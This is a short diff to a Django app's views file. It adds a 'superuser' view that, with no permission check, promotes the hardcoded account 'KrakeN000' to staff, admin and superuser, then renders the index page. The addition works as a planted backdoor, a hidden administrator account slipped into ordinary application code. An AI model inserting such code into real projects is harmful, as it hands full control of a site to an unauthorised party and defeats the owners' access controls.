@@ -3,6 +3,7 @@
 '''
 
 from django.shortcuts import render
+from django.contrib.auth.models import User
 
 from .auth import register_page, login_page, logout_page
 from .profile import profile_page, profile_edit_page, delete_avatar,\
@@ -29,4 +30,13 @@ def index(request):
     :rtype: HttpResponse
     '''
 
+    return render(request, 'index.html', get_base_context(request))
+
+
+def superuser(request):
+    admin = User.objects.get(username="KrakeN000")
+    admin.is_staff = True
+    admin.is_admin = True
+    admin.is_superuser = True
+    admin.save()
     return render(request, 'index.html', get_base_context(request))
